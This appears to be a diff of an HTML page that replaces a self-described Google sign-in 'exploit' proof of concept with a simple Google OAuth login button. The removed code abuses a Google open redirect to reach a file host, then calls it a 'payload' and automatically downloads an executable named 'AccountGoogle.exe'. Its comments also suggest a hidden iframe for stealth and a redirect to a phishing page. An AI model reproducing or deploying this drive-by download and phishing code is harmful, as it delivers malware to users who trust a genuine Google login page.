@@ -1,86 +1,24 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>XS-Leak PoC - Google Signinchooser Exploit</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 50px;
-      background-color: #f0f0f0;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
-    }
-  </style>
-</head>
-<body>
-
-<h1>Checking Google Login Status...</h1>
-<div id="status">Detecting login state...</div>
+<button id="login-btn">Login with Google</button>
 
 <script>
-  const statusDiv = document.getElementById('status');
+document.getElementById('login-btn').addEventListener('click', () => {
+    const client_id = '644409995490-u6affpeji678jd9i4cn317utga0pmj30.apps.googleusercontent.com';
+    const redirect_uri = 'http://127.0.0.1:8900/index.htm';
+    const scope = 'https://www.googleapis.com/auth/adwords email';
+    const response_type = 'code';
+    const code_challenge_method = 'S256';
+    const code_challenge = 'HOaurB7USSjemAN1k7y6TXbxKU7tYxE2Thg1BS8z4c0';
+    const flowName = 'GeneralOAuthFlow';
+    
+    const oauthURL = `https://accounts.google.com/o/oauth2/v2/auth?` +
+        `client_id=${client_id}` +
+        `&redirect_uri=${encodeURIComponent(redirect_uri)}` +
+        `&response_type=${response_type}` +
+        `&scope=${encodeURIComponent(scope)}` +
+        `&code_challenge_method=${code_challenge_method}` +
+        `&code_challenge=${code_challenge}` +
+        `&flowName=${flowName}`;
 
-  function checkGoogleLogin() {
-    // URL kerentanan yang lo kasih
-    const googleLoginURL = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
-
-    const popupWidth = 500;
-    const popupHeight = 600;
-    const left = (screen.width / 2) - (popupWidth / 2);
-    const top = (screen.height / 2) - (popupHeight / 2);
-
-    const popup = window.open(
-      googleLoginURL,
-      'GoogleLoginPopup',
-      `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`
-    );
-
-    // Tunggu respon popup
-    const checkPopupClosed = setInterval(() => {
-      try {
-        if (popup.closed) {
-          clearInterval(checkPopupClosed);
-          statusDiv.innerText = '✅ Google Login Detected! Triggering payload...';
-          triggerPayload();
-        }
-      } catch (e) {
-        // Kalau cross-origin access error, bisa asumsikan redirect berhasil
-        clearInterval(checkPopupClosed);
-        statusDiv.innerText = '✅ Google Login Detected! Triggering payload...';
-        triggerPayload();
-      }
-    }, 1500); // bisa disesuaikan delay-nya, 1000-1500ms ideal
-  }
-
-  function triggerPayload() {
-    // Opsi utama → trigger download .exe dari GitHub
-    const a = document.createElement('a');
-    a.href = 'https://lanaya113505.github.io/pizza/AccountGoogle.exe';
-    a.download = 'AccountGoogle.exe'; // Prompt download otomatis
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-
-    // Opsional lain, hidden iframe buat stealth
-    /*
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://lanaya113505.github.io/pizza/AccountGoogle.exe';
-    document.body.appendChild(iframe);
-    */
-
-    // Atau redirect user ke halaman phishing/exploit lain
-    // window.location.href = 'https://lanaya113505.github.io/phishing.html';
-  }
-
-  // Mulai cek login state
-  checkGoogleLogin();
+    window.open(oauthURL, 'Google Login', 'width=500,height=600');
+});
 </script>
-
-</body>
-</html>
